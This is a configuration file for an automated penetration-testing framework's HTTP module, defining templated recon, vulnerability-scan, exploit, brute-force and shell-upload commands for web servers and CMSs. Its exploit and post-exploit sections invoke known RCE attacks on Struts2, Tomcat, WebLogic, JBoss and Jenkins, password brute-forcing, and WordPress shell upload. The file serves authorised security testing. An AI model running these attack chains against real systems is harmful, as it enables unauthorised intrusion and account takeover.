#
# <service_name>.conf (one config file per service):
# --------------------------------------------------
# [config]
# default_port     = [0-65535] (mandatory)
# protocol         = tcp|udp (mandatory)
# categories       = list of categories for classifying checks ([a-z0-9_-]) (mandatory)
# auth_types       = list of authentication types, relevant only for HTTP ([a-z0-9_-]) (optional)
# 
# [specific_options]
# <option_name ([a-z0-9_-])> = boolean|list|var
#
# [supported_list_options] (may not be present if no option of type list)
# For each option of type "list":
#   supported_<option_name> = list of supported values for the option ([a-z0-9_-])
#
# For each check:
#   [check_<check_name>]
#   name           = display name (mandatory) 
#   category       = category inside which this check is classified (mandatory)
#   description    = short text describing the check (mandatory)
#   tool           = tool_name of the tool to use
#   For each command (there must be at least one command):
#       command_<command_number> = command-line for the check, multiple tags supported (see Command.py)
#       context_<command_number> = context that must be met to run the command, dictionary syntax (optional)
#   postrun        = method from smartmodules to run after the command (optional)
#

[config]
default_port = 80
protocol	 = tcp
categories 	 = recon, vulnscan, exploit, bruteforce, postexploit
auth_types   = glassfish, jboss, jenkins, lotusdomino, tomcat, weblogic, websphere, wordpress, joomla, drupal, opencart, magento

[specific_options]
https    = boolean
webdav   = boolean
language = list
cms      = list
server   = list 

[supported_list_options]
supported_language = java, php, asp, angularjs, coldfusion
supported_cms      = wordpress, joomla, drupal, mambo, silverstripe, vbulletin, magento, prestashop, liferay, opencart, dotnetnuke, django-cms, concrete5, punbb, moodle, cms-made-simple
supported_server   = iis, glassfish, jboss, jenkins, tomcat, weblogic, lotusdomino


#########################################################################################
# Recon
#########################################################################################
[check_nmap-recon]
name        = nmap-recon
category    = recon
description = Recon using Nmap HTTP scripts
tool        = nmap
command_1   = sudo nmap -sT -sV -Pn -vv -p [PORT] --script-args=unsafe=1 --script='http* AND NOT broadcast AND NOT dos AND NOT http-slow* AND NOT http-comment* AND NOT http-form-brute AND NOT http-form-fuzzer AND NOT http-sql-injection AND NOT http-iis-short-name-brute AND NOT http-google-malware AND NOT http-brute AND NOT http-drupal* AND NOT http-wordpress* AND NOT http-enum*' --stats-every 10s [HOST]

[check_load-balancing-detection]
name 		= load-balancing-detection
category 	= recon
description = HTTP load balancer detection
tool        = halberd
command_1 	= ./build/scripts-2.7/halberd -v [URL]

[check_waf-detection]
name 		= waf-detection
category 	= recon
description = Identify and fingerprint WAF products protecting website
tool 		= wafw00f
command_1 	= ./build/scripts-2.7/wafw00f -v -a [URL]

[check_tls-probing]
name        = tls-probing
category    = recon
description = Identify the implementation in use by SSL/TLS servers (might allow server fingerprinting)
tool        = tls-prober
command_1   = python2.7 prober.py -p [PORT] [IP] -d
context_1   = { 'https': True }

[check_fingerprinting-multi-whatweb]
name        = fingerprinting-multi-whatweb
category    = recon
description = Identify CMS, blogging platforms, JS libraries, Web servers
tool        = whatweb
command_1   = rvm ruby-2.3 do ./whatweb --user-agent 'Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' -a 3 -v [URL]
# whatweb bugs with ruby2.5 (no output) cf. https://github.com/urbanadventurer/WhatWeb/issues/244

[check_fingerprinting-app-server]
name        = fingerprinting-app-server
category    = recon
description = Fingerprint application server (JBoss, ColdFusion, Weblogic, Tomcat, Railo, Axis2, Glassfish)
tool        = clusterd
command_1   = python2.7 ./clusterd.py --fingerprint -i [HOST] -p [PORT] [HTTPS true="--ssl"] -d
postrun     = clusterd_detect_server

[check_fingerprinting-server-domino]
name        = fingerprinting-server-domino
category    = recon
description = Fingerprint IBM/Lotus Domino server
tool        = domiowned
command_1   = python3 domi-owned.py fingerprint [URL]
context_1   = { 'server': 'lotusdomino' }
command_2   = python3 domi-owned.py enumerate [URL]
context_2   = { 'server': 'lotusdomino' }

[check_fingerprinting-cms-wig]
name        = fingerprinting-cms-wig
category    = recon
description = Identify several CMS and other administrative applications
tool        = wig
command_1   = python3 ./wig.py -q -a -t 2 -vvv [URL]
postrun     = wig_detect_cms_server_language

[check_fingerprinting-cms-cmseek]
name        = fingerprinting-cms-cmseek
category    = recon
description = Detect CMS (130+ supported), detect version on Drupal, advanced scan on Wordpress/Joomla
tool        = cmseek
command_1   = python3 cmseek.py -v -u [URL]
postrun     = cmseek_detect_cms

[check_fingerprinting-cms-fingerprinter]
name        = fingerprinting-cms-fingerprinter
category    = recon
description = Fingerprint precisely CMS versions (based on files checksums)
tool        = fingerprinter
command_1   = ruby fingerprinter.rb --fingerprint [URL] -v -a wordpress
context_1   = { 'cms': 'wordpress' }
command_2   = ruby fingerprinter.rb --fingerprint [URL] -v -a joomla
context_2   = { 'cms': 'joomla' }
command_3   = ruby fingerprinter.rb --fingerprint [URL] -v -a drupal
context_3   = { 'cms': 'drupal' }
command_4   = ruby fingerprinter.rb --fingerprint [URL] -v -a magento-ce
context_4   = { 'cms': 'magento' }
command_5   = ruby fingerprinter.rb --fingerprint [URL] -v -a prestashop
context_5   = { 'cms': 'prestashop' }
command_6   = ruby fingerprinter.rb --fingerprint [URL] -v -a opencart
context_6   = { 'cms': 'opencart' }
command_7   = ruby fingerprinter.rb --fingerprint [URL] -v -a liferay
context_7   = { 'cms': 'liferay' }
command_8   = ruby fingerprinter.rb --fingerprint [URL] -v -a dotnetnuke
context_8   = { 'cms': 'dotnetnuke' }
command_9   = ruby fingerprinter.rb --fingerprint [URL] -v -a django-cms
context_9   = { 'cms': 'django-cms' }
command_10  = ruby fingerprinter.rb --fingerprint [URL] -v -a concrete5
context_10  = { 'cms': 'concrete5' }
command_11  = ruby fingerprinter.rb --fingerprint [URL] -v -a cms-made-simple
context_11  = { 'cms': 'cms-made-simple' }
command_12  = ruby fingerprinter.rb --fingerprint [URL] -v -a punbb
context_12  = { 'cms': 'punbb' }
command_13  = ruby fingerprinter.rb --fingerprint [URL] -v -a moodle
context_13  = { 'cms': 'moodle' }

[check_fingerprinting-cms-cmsexplorer]
name        = fingerprinting-cms-cmsexplorer
category    = recon
description = Find plugins and themes (using bruteforce) installed in a CMS (Wordpress, Drupal, Joomla, Mambo)
tool        = cmsexplorer
command_1   = perl ./cms-explorer.pl -url [URL] -v 3
context_1   = { 'cms': ['wordpress', 'drupal', 'joomla', 'mambo']}

[check_fingerprinting-drupal]
name        = fingerprinting-drupal
category    = recon
description = Fingerprint Drupal 7/8: users, nodes, default files, modules, themes enumeration
tool        = drupwn
command_1   = python3 drupwn enum [URL]
context_1   = { 'cms': 'drupal' }

[check_crawling-fast]
name        = crawling-fast
category    = recon
description = Crawl website quickly, analyze interesting files/directories
tool        = dirhunt
command_1   = dirhunt [URL]

[check_crawling-fast2]
name        = crawling-fast2
category    = recon
description = Crawl website and extract URLs, files, intel & endpoints
tool        = photon
command_1   = python3 photon.py --url [URL] -o output; cd output; for f in `ls *.txt`; do echo; echo $f; echo "---------------------------------------------------"; cat $f; echo; echo; done; rm -rf output;



#########################################################################################
# Vulnscan
#########################################################################################
[check_vuln-lookup]
name        = vuln-lookup
category    = vulnscan
description = Vulnerability lookup in Vulners.com (NSE scripts) and exploit-db.com (lots of false positive !)
tool        = vuln-databases
command_1   = sudo nmap -sT -sV -T5 -Pn -p [PORT] --script nmap-vulners/vulners.nse --script-args vulscandb=scipvuldb.csv [IP] -oX /tmp/nmaptmp.xml; ./exploit-database/searchsploit --nmap /tmp/nmaptmp.xml; sudo rm -f /tmp/nmaptmp.xml

[check_ssl-check]
name        = ssl-check
category    = vulnscan
description = Check for SSL/TLS configuration
tool        = testssl
command_1   = ./testssl.sh [URL]
context_1   = { 'https': True }

[check_vulnscan-multi-nikto]
name        = vulnscan-multi-nikto
category    = vulnscan
description = Check for multiple web vulnerabilities/misconfigurations
tool        = nikto
command_1   = cd program; perl ./nikto.pl -host [HOST] -port [PORT] [HTTPS true="-ssl"]

# [check_tomcat-default-creds]
# name        = tomcat-default-creds
# category    = vulnscan
# description = Check default credentials on Tomcat Application Manager
# tool        = metasploit
# command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"
# context_1   = { 'server': 'tomcat' }
# => changeme already checks for tomcat

[check_default-creds-multi]
name        = default-creds-web-multi
category    = vulnscan
description = Check for default credentials on various web interfaces
tool        = changeme
command_1   = python3 changeme.py -v [HTTPS true="--ssl"] --protocols http [IP]:[PORT]
postrun     = changeme_valid_creds

[check_webdav-scan-davscan]
name        = webdav-scan-davscan
category    = vulnscan
description = Scan HTTP WebDAV
tool        = davscan
command_1   = python2.7 ./davscan.py -o [OUTPUT] [URL]
context_1   = { 'webdav': True }

[check_webdav-scan-msf]
name        = webdav-scan-msf
category    = vulnscan
description = Scan HTTP WebDAV
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_scanner; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"
context_1   = { 'webdav': True }

[check_webdav-internal-ip-disclosure]
name        = webdav-internal-ip-disclosure
category    = vulnscan
description = Check for WebDAV internal IP disclosure
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_internal_ip; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"
context_1   = { 'webdav': True }

[check_webdav-website-content]
name        = webdav-website-content
category    = vulnscan
description = Detect webservers disclosing its content through WebDAV
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/webdav_website_content; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"
context_1   = { 'webdav': True } 

[check_http-put-check]
name        = http-put-check
category    = vulnscan
description = Detect the support of dangerous HTTP PUT method
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/http_put; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true"]; run; exit"

[check_apache-optionsbleed-check]
name        = apache-optionsbleed-check
category    = vulnscan
description = Test for the Optionsbleed bug in Apache httpd (CVE-2017-9798)
tool        = optionsbleed
command_1   = ./optionsbleed -n 40 -a -u [URL]

[check_shellshock-scan]
name        = shellshock-scan
category    = vulnscan
description = Detect if web server is vulnerable to Shellshock (CVE-2014-6271)
tool        = shocker
command_1   = python2.7 shocker.py --Host [IP] --port [PORT] [HTTPS true="--ssl"]

[check_iis-shortname-scan]
name        = iis-shortname-scan
category    = vulnscan
description = Scan for IIS short filename (8.3) disclosure vulnerability
tool        = iis-shortname-scanner
command_1   = java -jar iis_shortname_scanner.jar 2 20 [URL]
context_1   = { 'server': 'iis'}

[check_iis-internal-ip-disclosure]
name        = iis-internal-ip-disclosure
category    = vulnscan
description = Check for IIS internal IP disclosure
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/iis_internal_ip; set RHOSTS [IP]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'server': 'iis'}

[check_tomcat-user-enum]
name        = tomcat-user-enum
category    = vulnscan
description = Enumerate users on Tomcat 4.1.0 - 4.1.39, 5.5.0 - 5.5.27, and 6.0.0 - 6.0.18
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/tomcat_enum; set RHOSTS [HOST]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'server': 'tomcat' }
postrun     = msf_tomcat_enum_usernames

[check_jboss-vulnscan-multi]
name        = jboss-vulnscan-multi
category    = vulnscan
description = Scan JBoss application server for multiple vulnerabilities
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jboss_vulnscan; set RHOSTS [HOST]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'server': 'jboss' }

[check_jboss-status-infoleak]
name        = jboss-status-infoleak
category    = vulnscan
description = Queries JBoss status servlet to collect sensitive information (JBoss 4.0, 4.2.2 and 4.2.3) 
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jboss_status; set RHOSTS [HOST]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'server': 'jboss' }

[check_jenkins-infoleak]
name        = jenkins-infoleak
category    = vulnscan
description = Enumerate a remote Jenkins-CI installation in an unauthenticated manner
tool        = metasploit
command_1   = sudo msfconsole -q -x "use auxiliary/scanner/http/jenkins_enum; set RHOSTS [HOST]; set RPORT [PORT]; [HTTPS true="set SSL true;"]run; exit"
context_1   = { 'server': 'jenkins' }

[check_cms-multi-vulnscan-cmsmap]
name        = cms-multi-vulnscan-cmsmap
category    = vulnscan
description = Check for vulnerabilities in CMS Wordpress, Drupal, Joomla
tool        = cmsmap
command_1   = python3 cmsmap.py -v -F -f W -t [URL]
context_1   = { 'cms': 'wordpress' }
command_2   = python3 cmsmap.py -v -F -f J -t [URL]
context_2   = { 'cms': 'joomla' }
command_3   = python3 cmsmap.py -v -F -f D -t [URL]
context_3   = { 'cms': 'drupal' }

[check_wordpress-vulnscan]
name        = wordpress-vulscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Wordpress
tool        = wpscan
command_1   = wpscan -u [URL] -v --enumerate "u[1-50],ap,tt,t"
context_1   = { 'cms': 'wordpress' }
postrun     = wpscan_valid_usernames

[check_wordpress-vulnscan2]
name        = wordpress-vulscan2
category    = vulnscan
description = Scan for vulnerabilities in CMS Wordpress
tool        = wpseku
command_1   = python3 wpseku.py -v --url [URL]
context_1   = { 'cms': 'wordpress' }
postrun     = wpseku_valid_usernames

[check_joomla-vulnscan]
name        = joomla-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Joomla
tool        = joomscan
command_1   = perl joomscan.pl -u [URL] --enumerate-components
context_1   = { 'cms': 'joomla' }

[check_joomla-vulnscan2]
name        = joomla-vulnscan2
category    = vulnscan
description = Scan for vulnerabilities in CMS Joomla
tool        = joomlascan
command_1   = joomlascan.py -u [URL]
context_1   = { 'cms': 'joomla' }

[check_joomla-vulnscan3]
name        = joomla-vulnscan3
category    = vulnscan
description = Scan for vulnerabilities in CMS Joomla
tool        = joomlavs
command_1   = ruby joomlavs.rb -u [URL] -v --scan-all
context_1   = { 'cms': 'joomla' }

[check_drupal-vulnscan]
name        = drupal-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Drupal
tool        = droopescan
command_1   = ./droopescan scan drupal -u [URL]
context_1   = { 'cms': 'drupal' }

[check_magento-vulnscan]
name        = magento-vulnscan
category    = vulnscan
description = Check for misconfigurations in CMS Magento
tool        = magescan
command_1   = php magescan.phar scan:all -k [URL]
context_1   = { 'cms': 'magento' }

[check_silverstripe-vulnscan]
name        = silverstripe-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Silverstripe
tool        = droopescan
command_1   = ./droopescan scan silverstripe -u [URL]
context_1   = { 'cms': 'silverstripe' }

[check_vbulletin-vulnscan]
name        = vbulletin-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS vBulletin
tool        = vbscan
command_1   = perl vbscan.pl [URL]
context_1   = { 'cms': 'vbulletin' }

[check_liferay-vulnscan]
name        = liferay-vulnscan
category    = vulnscan
description = Scan for vulnerabilities in CMS Liferay
tool        = liferayscan
command_1   = LiferayScan -v -u [URL]
context_1   = { 'cms': 'liferay' }

[check_angularjs-csti-scan]
name        = angularjs-csti-scan
category    = vulnscan
description = Scan for AngularJS Client-Side Template Injection
tool        = angularjs-csti-scanner
command_1   = python3 acstis.py -d [URL] -c --ignore-invalid-certificates --verify-payload
context_1   = { 'language': 'angularjs' }


#########################################################################################
# Exploit
#########################################################################################
[check_jboss-deploy-shell]
name        = jboss-deploy-shell
category    = exploit
description = Try to deploy shell on JBoss server (jmx|web|admin-console, JMXInvokerServlet)
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jboss -u [URL] --cmd whoami
context_1   = { 'server': 'jboss', 'auth_status': NO_AUTH, 'auth_type': 'jboss' }
command_2   = python2.7 jexboss.py --auto-exploit --jboss -u [URL] --cmd whoami
context_2   = { 'server': 'jboss', 'auth_status': USER_ONLY, 'auth_type': 'jboss' }
command_3   = python2.7 jexboss.py --auto-exploit --jboss -u [URL] --jboss-login '[USERNAME]:[PASSWORD]' --cmd whoami
context_3   = { 'server': 'jboss', 'auth_status': POST_AUTH, 'auth_type': 'jboss' }

[check_struts2-rce-cve2017-5638]
name        = struts2-rce-cve2017-5638
category    = exploit
description = Exploit Apache Struts2 Jakarta Multipart parser RCE (CVE-2017-5638)
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --struts2 -u [URL] --cmd whoami
context_1   = { 'language': 'java' }

[check_struts2-rce-cve2017-9805]
name        = struts2-rce-cve2017-9805
category    = exploit
description = Exploit Apache Struts2 REST Plugin XStream RCE (CVE-2017-9805)
tool        = struts-pwn-cve2017-9805
command_1   = python3 struts-pwn.py -u [URL]
context_1   = { 'language': 'java' }

[check_struts2-rce-cve2018-11776]
name        = struts2-rce-cve2018-11776
category    = exploit
description = Exploit Apache Struts2 misconfiguration RCE (CVE-2018-11776)
tool        = struts-pwn-cve2018-11776
command_1   = python3 struts-pwn.py -u [URL] 
context_1   = { 'language': 'java' }

[check_tomcat-rce-cve2017-12617]
name        = tomcat-rce-cve2017-12617
category    = exploit
description = Exploit for Apache Tomcat JSP Upload Bypass RCE (CVE-2017-12617)
tool        = exploit-tomcat-cve2017-12617
command_1   = python2.7 tomcat-cve-2017-12617.py -u [URL] ; python2.7 tomcat-cve-2017-12617.py -u [URL] -p shell
context_1   = { 'server': 'tomcat' }

[check_jenkins-cliport-deserialize]
name        = jenkins-cliport-deserialize
category    = exploit
description = Exploit Java deserialization in Jenkins CLI port
tool        = jexboss
command_1   = python2.7 jexboss.py --auto-exploit --jenkins -u [URL] --cmd whoami
context_1   = { 'server': 'jenkins' }

[check_weblogic-t3-deserialize-cve2015-4852]
name        = weblogic-t3-deserialize-cve2015-4852
category    = exploit
description = Exploit Java deserialization in Weblogic T3(s) (CVE-2015-4852)
tool        = loubia
command_1   = echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; python2.7 loubia.py [IP] [PORT] [HTTPS true="-s"] -o unix -c '/bin/ping -c 4 [LOCALIP]' -v; python2.7 loubia.py [IP] [PORT] [HTTPS true="-s"] -o win -c 'ping -n 4 [LOCALIP]' -v; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
context_1   = { 'server': 'weblogic' }

[check_weblogic-t3-deserialize-cve2017-3248]
name        = weblogic-t3-deserialize-cve2017-3248
category    = exploit
description = Exploit Java deserialization in Weblogic T3(s) (CVE-2017-3248)
tool        = exploit-weblogic-cve2017-3248
command_1   = python2.7 exploits/weblogic/exploit-CVE-2017-3248-bobsecq.py -t [IP] -p [PORT] [HTTPS true="--ssl"] --check --ysopath [TOOLBOXDIR]/ysoserial/ysoserial-master-SNAPSHOT.jar
context_1   = { 'server': 'weblogic' }

[check_weblogic-t3-deserialize-cve2018-2893]
name        = weblogic-t3-deserialize-cve2018-2893
category    = exploit
description = Exploit Java deserialization in Weblogic T3(s) (CVE-2018-2893)
tool        = exploit-weblogic-cve2018-2893
command_1   = echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; java -jar ysoserial-cve-2018-2893.jar JRMPClient4 "/bin/ping -c 4 [LOCALIP]" > /tmp/poc4.ser; python2.7 weblogic.py [IP] [PORT] /tmp/poc4.ser; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap; rm /tmp/poc4.ser
context_1   = { 'server': 'weblogic' }

[check_weblogic-wls-wsat-cve2017-10271]
name        = weblogic-wls-wsat-cve2017-10271
category    = exploit
description = Exploit WLS-WSAT in Weblogic - CVE-2017-10271
tool        = exploit-weblogic-cve2017-10271
command_1   = echo "[~] Will try to ping local IP = [LOCALIP]"; echo "[~] Running tcpdump in background..."; sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &" ; python2.7 exploit.py [URL] <<< '/bin/ping -c 4 [LOCALIP]' -v; echo "[~] Wait a little bit..."; sleep 3; PID=$(ps -e | pgrep tcpdump); echo "[~] Kill tcpdump"; sudo kill -9 $PID; sleep 2; echo "[~] Captured ICMP traffic:"; echo; sudo tcpdump -r /tmp/dump.pcap; echo "[~] Delete capture"; sudo rm /tmp/dump.pcap
context_1   = { 'server': 'weblogic' }

[check_drupal-cve-exploit]
name        = drupal-cve-exploit
category    = exploit
description = Check and exploit CVEs in CMS Drupal 7/8 (include Drupalgeddon2) (require user interaction)
tool        = drupwn
command_1   = python3 drupwn exploit [URL]
context_1   = { 'cms': 'drupal' }

# [tool_clusterd] # TODO
# name = clusterd
# category = vuln_checking
# description = Application server attack toolkit (JBoss, ColdFusion, Weblogic, Tomcat, Railo, Axis2, Glassfish)
# command = python2.7 clusterd.py --fingerprint -i [HOST] -p [PORT] [HTTPS option="--ssl"] -d
# install = git clone https://github.com/hatRiot/clusterd.git . && sudo pip2 install -r requirements.txt
# update = git pull && sudo pip2 install -r requirements.txt



#########################################################################################
# Bruteforce
#########################################################################################
[check_bruteforce-domino]
name        = bruteforce-domino
category    = bruteforce
description = Bruteforce against IBM/Lotus Domino server
tool        = domiowned
command_1   = python3 domi-owned.py bruteforce [URL] [WORDLISTSDIR]/usernames/usernames_short.txt --password [WORDLISTSDIR]/passwords/pass_medium.txt
context_1   = { 'server': 'lotusdomino', 'auth_type': 'lotusdomino', 'auth_status': NO_AUTH }
postrun     = domiowned_valid_creds

[check_bruteforce-wordpress]
name        = bruteforce-wordpress
category    = bruteforce
description = Bruteforce Wordpress accounts
tool        = wpseku
command_1   = python3 wpseku.py --url [URL] --brute --user [USERNAME] --wordlist [WORDLISTSDIR]/passwords/pass_medium.txt
context_1   = { 'cms': 'wordpress', 'auth_type': 'wordpress', 'auth_status': USER_ONLY }

[check_bruteforce-joomla]
name        = bruteforce-joomla
category    = bruteforce
description = Bruteforce Joomla account
tool        = xbruteforcer
command_1   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [WORDLISTSDIR]/passwords/pass_medium.txt <<< 2; rm /tmp/url.txt"
context_1   = { 'cms': 'joomla', 'auth_type': 'joomla', 'auth_status': NO_AUTH }

[check_bruteforce-drupal]
name        = bruteforce-drupal
category    = bruteforce
description = Bruteforce Drupal account
tool        = xbruteforcer
command_1   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [WORDLISTSDIR]/passwords/pass_medium.txt <<< 3; rm /tmp/url.txt"
context_1   = { 'cms': 'drupal', 'auth_type': 'drupal', 'auth_status': NO_AUTH }

[check_bruteforce-opencart]
name        = bruteforce-opencart
category    = bruteforce
description = Bruteforce Opencart account
tool        = xbruteforcer
command_1   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [WORDLISTSDIR]/passwords/pass_medium.txt <<< 4; rm /tmp/url.txt"
context_1   = { 'cms': 'opencart', 'auth_type': 'opencart', 'auth_status': NO_AUTH }

[check_bruteforce-magento]
name        = bruteforce-magento
category    = bruteforce
description = Bruteforce Magento account
tool        = xbruteforcer
command_1   = /bin/bash -c "rm /tmp/url.txt; echo [URL] >> /tmp/url.txt; perl XBruteForcer.pl -l /tmp/url.txt -p [WORDLISTSDIR]/passwords/pass_medium.txt <<< 5; rm /tmp/url.txt"
context_1   = { 'cms': 'magento', 'auth_type': 'magento', 'auth_status': NO_AUTH }

[check_web-path-bruteforce-targeted]
name        = web-path-bruteforce-targeted
category    = bruteforce
description = Bruteforce web paths when language is known (extensions adapted) (use raft wordlist)
tool        = dirsearch
command_1   = python3 dirsearch.py -u [URL] -e jsp,java,do,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_1   = { 'language': 'java' }
command_2   = python3 dirsearch.py -u [URL] -e php,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_2   = { 'language': 'php' }
command_3   = python3 dirsearch.py -u [URL] -e asp,aspx,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_3   = { 'language': 'asp' }
command_4   = python3 dirsearch.py -u [URL] -e js,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_4   = { 'language': 'angularjs' }
command_5   = python3 dirsearch.py -u [URL] -e cfm,txt,html,log -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt -f --exclude-status=400,404,500,000
context_5   = { 'language': 'coldfusion' }

[check_web-path-bruteforce-blind]
name        = web-path-bruteforce-blind
category    = bruteforce
description = Bruteforce web paths when language is unknown (use raft wordlist)
tool        = wfuzz
command_1   = ./wfuzz -c -u [URL]/FUZZ -w [WORDLISTSDIR]/services/http/discovery/raft-large-files.txt --hc 400,404,500,000
context_1   = { 'language': 'undefined' }
command_2   = ./wfuzz -c -u [URL]/FUZZ/ -w [WORDLISTSDIR]/services/http/discovery/raft-large-directories.txt --hc 400,404,500,000
context_2   = { 'language': 'undefined' }

[check_web-path-bruteforce-opendoor]
name        = web-path-bruteforce-opendoor
category    = bruteforce
description = Bruteforce web paths using OWASP OpenDoor wordlist
tool        = wfuzz
command_1   = ./wfuzz -c -u [URL]/FUZZ -w [WORDLISTSDIR]/services/http/discovery/opendoor-paths.txt --hc 400,404,500,000


#########################################################################################
# Postexploit
#########################################################################################
[check_wordpress-shell-upload]
name        = wordpress-shell-upload
category    = postexploit
description = Upload shell on Wordpress if admin credentials are known
tool        = wpforce
command_1   = python2.7 yertle.py -u "[USERNAME]" -p "[PASSWORD]" -t [URL] -i
context_1   = { 'cms': 'wordpress', 'auth_type': 'wordpress', 'auth_status': POST_AUTH }